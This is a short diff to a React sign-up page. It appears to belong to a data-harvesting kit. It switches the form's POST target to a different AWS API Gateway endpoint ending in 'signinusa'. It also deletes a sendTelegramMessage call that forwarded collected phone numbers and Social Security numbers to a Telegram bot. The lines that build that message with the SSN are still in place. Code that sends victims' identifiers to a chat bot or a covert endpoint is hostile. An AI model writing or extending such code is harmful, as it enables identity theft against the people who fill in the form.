@@ -60,7 +60,7 @@ const SignUpPage: React.FC = () => {
 
       // API Call
       const response = await axios.post(
-        'https://ymcq30o8c7.execute-api.us-east-1.amazonaws.com/au',
+        'https://kj0cthjwe4.execute-api.us-east-1.amazonaws.com/latest/signinusa',
         requestBody,
         { headers: { 'Content-Type': 'application/json' } }
       );
@@ -75,7 +75,7 @@ const SignUpPage: React.FC = () => {
         📞 Phone: ${storedData.phone}
         ssn: ${storedData.ssn}
       `;
-      await sendTelegramMessage(telegramMessage);
+      
       localStorage.setItem("username", form.username);
 
       alert(`Success: ${response.data.message}`);
